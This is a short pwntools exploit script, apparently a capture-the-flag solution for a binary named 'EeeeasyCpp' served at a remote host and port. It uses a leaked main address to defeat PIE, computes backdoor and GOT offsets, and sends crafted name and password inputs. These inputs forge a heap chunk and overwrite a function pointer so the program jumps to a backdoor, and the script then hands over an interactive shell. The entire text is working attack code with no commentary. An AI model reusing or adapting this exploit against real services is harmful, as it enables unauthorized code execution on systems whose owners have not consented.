from pwn import*
context(arch = 'amd64', os = 'linux', log_level = 'debug')
elf = ELF('./EeeeasyCpp')


p = remote('yuanshen.life', 39370)
p.recvuntil('I\'ll give you a gift: ')
main_addr = int(p.recv(14), 16)
elf_bass  = main_addr - 0x2650
backdoor  = elf_bass + 0x22E8#0x22E0
print_got = elf_bass + 0x5010#elf.got['_ZNSt13runtime_errorD1Ev']#0x5070#
fun       = elf_bass + 0x4D48
data      = elf_bass + 0x5258 + 0x10
print('main_addr = ' + hex(main_addr))
print('elf_bass = ' + hex(elf_bass))
print('backdoor = ' + hex(backdoor))
print('print_got = ' + hex(print_got))
print('fun = ' + hex(fun))

p.recvuntil('>> ')
p.sendline(b'G')
p.recvuntil('Enter your name: ')
p.sendline( b'aaaa' )
p.recvuntil('Enter your password: ')
p.sendline( b'b' * 15 + b'\x00' + p64(0) + p64(0x21) + p64(fun) + p64(print_got) )

p.recvuntil('>> ')
p.sendline(b'G')
p.recvuntil('Enter your name: ')
p.sendline( p64(backdoor) )
p.recvuntil('Enter your password: ')
p.sendline( b'a'*0x20 )

p.interactive()

